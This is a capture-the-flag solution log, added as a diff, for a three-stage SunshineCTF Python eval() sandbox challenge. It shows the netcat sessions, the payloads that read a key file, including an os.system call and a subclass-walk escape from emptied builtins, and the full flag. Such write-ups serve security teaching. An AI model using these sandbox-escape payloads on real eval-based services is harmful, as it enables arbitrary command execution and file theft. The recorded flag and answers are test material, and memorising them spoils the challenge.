@@ -1,0 +1,62 @@
+$ nc 0.0.0.0 65000
+Welcome to the ProcrastinatorProgrammer backend.
+Please give me an equation! Any equation! I need to be fed some data to do some processing!I'm super secure, and can use all python! I just use `eval()` on your data and then whamo, python does all the work!Whatever you do, don't look at my ./key!
+
+Give me an equation please!
+
+open('key').read()
+sun{eval_is
+
+If you completed part 1 of the challenge...
+
+Your princess is in another castle! 🔥🏰🔥
+
+procrastinate-castle.2021.sunshinectf.org 65001 holds your next clue.
+
+###
+
+$ nc 0.0.0.0 65001
+Welcome to the ProcrastinatorProgrammer backend.
+Please give me an equation! Any equation! I need to be fed some data to do some processing!Due to technical difficulties with the last challenge, I've upped my ante! Now I know it's secure!I'm super secure, and can use most python math! I just use `eval(client_input, \{\}, safe_math_functions)` on your data and then whamo, python does all the work!Whatever you do, don't look at my ./key!
+
+Halt in the name of the law!
+
+What was the ./key found in the previous challenge?
+
+sun{eval_is
+Give me an equation please!
+
+__import__('os').system('cat key')
+_safe_
+
+If you completed part 2 of the challenge...
+
+You need sequels. MORE SEQUELS!! 🔥🏰🔥
+
+procrastinate-sequel.2021.sunshinectf.org 65002 holds your next clue.
+
+###
+
+$ nc 0.0.0.0 65002
+Welcome to the ProcrastinatorProgrammer backend.
+Please give me an equation! Any equation! I need to be fed some data to do some processing!Due to technical difficulties with the previous set, I had to remove math lib support! In fact the only thing this can do is add and subtract now!... I think. Google tells me that it's secure now! Well the second result anyhow.I'm super secure, and can use a bit of python math! I just use `eval(client_input, {'__builtins__':\{\}})` on your data and then whamo, python does all the work!Whatever you do, don't look at my ./key!
+
+Halt in the name of the law!
+
+What was the ./key found in the previous challenge?
+
+_safe_
+Give me an equation please!
+
+().__class__.__base__.__subclasses__()[219](('cat','key'),stdout=-1).communicate().__getitem__(0)
+b'only_if_you_ast_whitelist_first}'
+
+If you completed part 3 of the challenge...
+
+ just sum the three clues together to get the flag. It's a three-part equation, very complicated.
+
+
+
+
+
+The flag is: sun{eval_is_safe_only_if_you_ast_whitelist_first}
